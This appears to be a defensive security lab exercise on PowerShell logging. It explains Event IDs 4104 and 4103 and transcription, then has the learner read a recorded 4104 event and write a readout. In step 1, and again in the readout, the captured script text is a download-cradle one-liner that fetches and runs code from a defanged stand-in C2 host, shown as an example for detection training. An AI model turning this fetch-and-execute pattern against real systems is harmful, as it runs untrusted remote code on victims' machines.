## BRIEF
Three PowerShell log sources exist. **ScriptBlock logging → Event ID 4104** records the *de-obfuscated* script text — the source that matters most, because it's decoded even when the command that ran was encoded or obfuscated. **Module logging → 4103** records pipeline execution detail. **Transcription** writes the full session's input/output to a text file.
You'll pull the `ScriptBlockText` field out of a real, shipped 4104 event for real, then record what it shows.

## GUIDED STEPS

1. **Read the shipped event out for real**:
   ```bash
   pwsh -NoProfile -NonInteractive -File read4104.ps1
   ```
   Real output:
   ```
   iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/s1')
   ```
   That's `ScriptBlockText` from `event-4104.xml` (`cat event-4104.xml` to see the full event) — a download-cradle one-liner (L4.1/L3.5), recorded **decoded**, exactly as it ran.

2. **Compare the three log sources** (static reference):
   ```text
   4104  ScriptBlock logging   -> the DECODED script text, at runtime, right before execution -- THE source
   4103  Module logging        -> pipeline execution detail (which cmdlets ran, not full script text)
   —     Transcription         -> full session input/output, written to a text file on disk
   ```
   This is why 4104 beats `-EncodedCommand`/obfuscation (L4.2): whatever arrives encoded is decoded before AMSI (L4.3) or 4104 ever sees it. Reading `ScriptBlockText` is reading exactly what executed — this is the bridge into SOC's alert-triage work (SOC L3.2).

3. **Record your readout**:
   Create `readout.md`:
   ```markdown
   # 4104 Event Readout
   Event ID: 4104 (ScriptBlock logging).
   ScriptBlockText shows a download cradle: iex (New-Object Net.WebClient).DownloadString(...) fetching from a fake C2 host.
   ScriptBlock logging is the log source that records de-obfuscated content -- 4103 only logs pipeline/module detail, and Transcription logs the full session, not just the script block.
   ```

4. **Check your work**:
   ```bash
   lab check ps L4.5
   ```
